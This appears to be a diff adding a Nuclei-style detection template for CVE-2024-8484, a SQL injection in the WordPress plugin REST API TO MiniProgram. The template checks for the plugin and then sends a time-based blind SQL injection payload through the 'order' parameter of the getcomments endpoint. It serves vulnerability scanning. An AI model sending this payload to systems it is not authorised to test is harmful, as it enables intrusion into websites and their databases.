@@ -1,0 +1,48 @@
+id: wordpress-plugin-rest-api-yo-miniprogram-sqli
+
+info:
+  name: WordPress Plugin REST API TO MiniProgram SQL Injection Vulnerability (CVE-2024-8484)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,CVE-2024-8484
+  description: |
+    This template detects a SQL injection vulnerability in the WordPress plugin REST API TO MiniProgram.
+    The vulnerability allows an attacker to execute arbitrary SQL commands by exploiting the vulnerable endpoint.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - id: check-plugin
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/wp-content/plugins/rest-api-to-miniprogram"
+
+  - id: test-sqli
+    method: GET
+    path:
+      - "{{BaseURL}}/wp-json/watch-life-net/v1/comment/getcomments?order=DESC,(SELECT(1)FROM(SELECT(SLEEP({{t1}})))a)--&postid=3&limit=1&page=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":\"success\""
+          - "status"
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
